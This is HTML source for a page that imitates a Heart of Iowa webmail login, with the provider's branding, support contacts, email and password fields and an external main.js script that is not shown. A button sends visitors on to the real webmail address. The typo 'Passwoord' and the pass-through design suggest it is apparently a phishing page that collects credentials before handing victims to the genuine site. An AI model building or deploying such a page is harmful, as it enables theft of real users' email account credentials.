<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Webmail:Welcome to Webmail</title>
</head>
<body class="bg-white">
    <div class="flex justify-center mt-0">
        <img src="img/heartofiowa.png" alt="">
    </div>
    <div class="flex text-start flex-col justify-center mx-auto ml-auto bg-[#F2F2F2] w-[460px] p-4">
            <p class="text-start text-sm font-bold">Welcome to New Web Mail!</p> <br>
            <p class="text-xs">- Enter your entire email address (not just your username) and password to login.</p> <br>
            <p class="text-sm">For more information please visit <a href="https://www.netins.net/support" class="text-blue-300 focus:underline">Support</a> or call 1-877-486-4422</p>
    </div>
    <div class="flex justify-center md:w-[450px] md:h-[400px] md:mx-auto flex-row mt-5 bg-white p-5 h-[592px]">
        <form action="" id="form">
        <div class="md:mt-6 md:pl-6 flex flex-col justify-center gap-6 w-full">
            <div class="flex gap-4 flex-col">
                <div class="flex flex-col gap-1">
                    <label  class="text-sm">E-mail address</label>
                    <input type="email" id="email" class="md:w-[350px] border-2 h-8 p-2 focus:ring-1 focus:outline-none focus:ring-[#6D9CC9] " required>
                </div>
    
                <div class="flex flex-col gap-1">
                    <label for="" class="text-sm">Passwoord</label>
                    <input type="password" id="password" class="md:w-[350px] border-2 h-8 p-2 focus:ring-1 focus:outline-none focus:ring-[#6D9CC9]" required>
                </div>
            </div>

            <div class="flex flex-col gap-4 md:gap-10">
                <div class="flex">
                    <label for="" class="relative inline-flex items-center cursor-pointer">
                        <input type="checkbox" class="sr-only peer">
                        <div class="w-8 h-4 rounded-full bg-gray-600 peer-checked:after:translate-x-full 
                        rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white 
                        after:content-[''] after:absolute after:top-0.4 after:start-[0.3px] after:bg-white after:border-gray-200
                        after:border after:rounded-full after:h-4 after:w-4 after:transition-all border-gray-600 peer-checked:bg-blue-700"></div>
                    </label>
                    <p class="text-sm font-normal pl-6 pt-4 md:pt-0">Shared computer - log me out after 4 hours</p>
                </div>

                <div class="flex flex-row items-center justify between">
                    <label for="" class="relative inline-flex items-center cursor-pointer">
                        <input type="checkbox" class="sr-only peer" checked>
                        <div class="w-8 h-4 rounded-full bg-gray-600 peer-checked:after:translate-x-full 
                        rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white 
                        after:content-[''] after:absolute after:top-0.4 after:start-[0.3px] after:bg-white after:border-gray-200
                        after:border after:rounded-full after:h-4 after:w-4 after:transition-all border-gray-600 peer-checked:bg-[#6D9CC9]"></div>
                    </label>
                    <p class="text-sm font-normal pl-6">Keep me logged in until I log out</p>
                </div>
            </div>
            <div class="flex justify-center md:mt-6">
                <script>
                    function redirect() {
                      window.location.href = "https://webmail.heartofiowa.net/"+[];
                    }
                  </script>
                <button type="submit" class="hover:opacity-80 bg-[#6D9CC9] w-[195px] py-2 inline-block text-white rounded-md align-middle" onclick="redirect()">Login</button>
            </div>
           
        </div>
        </form>
    </div>

    

    <script src="main.js"></script>
</body>
</html>
